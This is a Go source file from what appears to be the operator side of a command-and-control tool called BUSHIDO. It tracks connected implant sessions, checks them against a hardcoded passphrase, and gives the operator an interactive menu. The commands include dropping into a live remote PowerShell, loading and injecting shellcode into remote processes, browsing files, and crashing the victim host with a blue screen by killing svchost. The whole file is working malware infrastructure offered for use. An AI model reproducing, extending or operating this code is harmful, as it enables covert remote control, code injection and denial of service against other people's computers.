package cmd

import (
	"bufio"
	"fmt"
	"math/rand"
	"net"
	"os"
	"regexp"
	"strconv"
	"strings"
	"time"

	"github.com/D3Ext/maldev/logging"
)

func NewSessionList() *SessionList {
	return &SessionList{
		Stop: make(chan struct{}),
	}
}

func (ll *SessionList) registerSession(port string, hostname string, user string, conn net.Conn) int {
	check := true
	id := -1
	for check {
		id = rand.Intn(9000)
		check = ll.checkIfSessionIDExist(id)
	}
	// Create a new Session struct
	newSession := &Session{
		id:       id,
		Port:     port,
		Status:   "Active",
		Hostname: hostname,
		User:     user,
		Conn:     conn,
		StopChan: make(chan struct{}),
	}
	// Add to the head of the linked list
	newSession.Next = ll.Head
	ll.Head = newSession
	return id
}

func authSession(conn *net.Conn) bool {
	auth := make([]byte, 32)
	(*conn).SetReadDeadline(time.Now().Add(60 * time.Second))
	(*conn).Write([]byte("WhoAreYou\n"))
	n, err := (*conn).Read(auth)
	if err != nil {
		fmt.Println() //Put this here for aesthetic reasons. Will use a go routine kill signal later to exit from handleclient proper
		fmt.Println()
		fmt.Println("[-]Error reading from connection:", err)
		return false
	}
	if n <= 1 {
		fmt.Println("[-]Error amount of data returned is less than 1")
		fmt.Println()
		return false
	}
	authString := string(auth[:n])

	// Perform authentication
	if authString != "i_L0V_y0U_Ju5t1n_P3t3R\n" {
		fmt.Println("[-]Authentication failed")
		fmt.Println()
		(*conn).Close()
		return false
	}
	(*conn).SetReadDeadline(time.Time{})
	return true
}

// Displays the active sessions
func (ll *SessionList) displaySessions() {
	fmt.Println("\n[!]Active Sessions:")
	current := ll.Head
	for current != nil {
		fmt.Println("[+]SessionID:", current.id, "- Port:", current.Port, "- Status:", current.Status)
		current = current.Next
	}
	fmt.Println()
}

// func (ll *SessionList) updateSessionStatus(targetPort string, status string, conn net.Conn) {
// 	current := ll.Head
// 	for current.Port != targetPort {
// 		current = current.Next
// 	}
// 	current.Status = status
// 	current.Conn = conn
// }

func (ll *SessionList) checkIfSessionIDExist(id int) bool {
	//Case Empty List
	if ll.Head == nil {
		return false
	}
	current := ll.Head
	for current != nil {
		if current.id == id {
			return true //Return that it exists
		}
		current = current.Next
	}
	return false //After itterating through all of the list return that it dont exist
}

func (sl *SessionList) getSessionByID(id int) *Session {
	current := sl.Head
	for current != nil {
		if current.id == id {
			return current
		}
		current = current.Next
	}
	return nil
}

func (ll *SessionList) displaySessionInfo(id int) {
	if ll.Head == nil {
		return
	}
	current := ll.Head
	for current != nil {
		if current.id == id {
			idStr := strconv.Itoa(current.id)
			fmt.Println()
			fmt.Println("[!]Session Info Found !")
			fmt.Println("[+]ID: " + idStr)
			fmt.Print("[+]Hostname: " + current.Hostname) //New line is present within the hostname. Will remove it later
			fmt.Println("[+]User: " + current.User)       //New line also is present here wtf windows ?!
			return
		}
		current = current.Next
	}
	fmt.Println()
	fmt.Println("[-]Couldn't get session info ")
	fmt.Println()
	//After itterating through all of the list return that it dont exist
}

func (ll *SessionList) closeAllSessions() {
	fmt.Println()
	current := ll.Head
	for current != nil {
		fmt.Println("[-]Unit on", current.id, "lost")
		close(current.StopChan) // <-- Signal the loop to stop
		current.Conn.Close()
		current.Conn = nil // Clear the connections list

		current = current.Next
	}
	fmt.Println()
	ll.Head = nil // Reset the listener list
}

func (ll *SessionList) closeSession(id int) {
	current := ll.Head
	if current == nil {
		return
	}
	if current.id == id {
		fmt.Println()
		fmt.Println("[!]Session Found !")
		fmt.Println("[+]Closing Session " + strconv.Itoa(current.id))
		close(current.StopChan) // <-- Signal the loop to stop
		current.Conn.Close()
		ll.Head = current.Next
		fmt.Println("[+]Successfully Ended the Session")
		fmt.Println()
		return
	}
	prev := current
	current = current.Next
	for current != nil {
		if current.id == id {
			fmt.Println()
			fmt.Println("[!]Session Found !")
			fmt.Println("[+]Closing Session " + strconv.Itoa(current.id))
			close(current.StopChan) // <-- Signal the loop to stop
			current.Conn.Close()
			prev.Next = current.Next
			fmt.Println("[+]Successfully Ended the Session")
			fmt.Println()
			return
		}
		prev = current
		current = current.Next
	}
	fmt.Println()
	fmt.Println("[-]Session not found")
	fmt.Println()
}

func openSession(id int, ll *SessionList) {
	current := ll.Head
	if current == nil {
		fmt.Println()
		fmt.Println("\n[-]Session not found")
		fmt.Println()
		return
	}
	for current != nil {
		if current.id == id {
			fmt.Println("\n[!]Session Found !")
			fmt.Println("[!]Connecting ...")
			//if !authSession(&current.Conn) {
			//	return
			//}
			fmt.Println("[+]BUSHIDO Shell Open ...\n")
			reader := bufio.NewReader(os.Stdin)

			for {
				fmt.Print(logging.SGreen("BU$H1D0-1 >> "))
				command, err := reader.ReadString('\n')
				if err != nil {
					fmt.Println("[-]Error reading input:", err)
					continue
				}
				command = strings.TrimSpace(command) //This removes leading and trailing whitespaces. It is very important. If something should work but isn't, this could be the reason
				loadRegex := regexp.MustCompile(`load .+`)
				loadMatch := loadRegex.FindString(command)
				cdRegex := regexp.MustCompile(`cd .+`)
				cdMatch := cdRegex.FindString(command)
				remoteThreadRegex := regexp.MustCompile(`inject .+ .+`) //arg1 is the shelcode arg2 is the pid
				remoteThreadMatch := remoteThreadRegex.FindString(command)
				if cdMatch != "" {
					dir2go := strings.Split(command, " ")[1]
					cd(&current.Conn, dir2go)
					continue
				}

				if loadMatch != "" {
					binFilePathLocal := strings.Split(command, " ")[1]
					load(&current.Conn, binFilePathLocal)
					fmt.Println()
					continue
				}
				if remoteThreadMatch != "" {
					binFilePathLocal := strings.Split(command, " ")[1]
					targetPID := strings.Split(command, " ")[2]
					remoteThread(&current.Conn, binFilePathLocal, targetPID)
					fmt.Println()
					continue
				}
				switch command { //All of the functions called below will be found under bushido.go
				case "shell":
					shell(&current.Conn)
				case "hostinfo":
					ll.displaySessionInfo(current.id)
				case "bsod": //Refine it a bit more
					if bsod(&current.Conn) {
						fmt.Println()
						fmt.Println("[!]HOST BSOD !")
						ll.closeSession(current.id)
						fmt.Println()
						return
					} else {
						fmt.Println()
						fmt.Println("[-]Couldn't BSOD the Host ...")
						fmt.Println()
					}
				case "bg":
					return
				case "exit":
					return
				case "load": //Works nicely but only with x64 payloads so be careful !!! //TO-DO add a prompt to exit if shit gets real
					fmt.Println("\n[?]Usage: load <pathTox64Shellcode>\n")
				case "inject":
					fmt.Println("\n[?]Usage: inject <pathToShellcode> <targetPID>")
				case "cd":
					fmt.Println("\n[?]Usage: cd <dir>\n") //Works with relative and absolute paths
				case "ls":
					ls(&current.Conn)
				case "dir":
					ls(&current.Conn)
				case "pwd":
					pwd(&current.Conn)
				// case "hollow":
				// 	fmt.Println("\n[?]Usage: hollow <pathToExeLocal> <\"path2ExeRemote\">")
				// 	fmt.Println("[?]Windows paths must have double backslashes as such: \"C:\\\\Program Files\\\\Internet Explorer\\\\iexplore.exe\"\n")
				case "help":
					fmt.Println()
					fmt.Println("[!]Below is a list of useful commands:\n   bg: will background the current session")
					fmt.Println("   bsod: Crashes the host by attempting to kill svchost (Admin+)")
					fmt.Println("   cd: Changes the local directory to the specified one eg cd ../Pictures")
					fmt.Println("   dir: Alias for ls")
					fmt.Println("   exit: Alias for bg")
					fmt.Println("   hostinfo: Displays information pertaining to the current house")
					fmt.Println("   inject: Attempts to write and execute shellcode into a remote process")
					fmt.Println("   load: Attempts to write and execute shellcode into the shell's process")
					fmt.Println("   ls: Lists the contents of current directory. Will upgrade in future to be able to do remote ones too")
					fmt.Println("   pwd: Prints the path to the implant")
					fmt.Println("   shell: Drops down into a live powershell session")
					fmt.Println()
				default:
					fmt.Println("\n[!]Invalid input\n")
				}
			}
		}
		current = current.Next
	}
	fmt.Println()
	fmt.Println("[-]Session not found")
	fmt.Println()
}
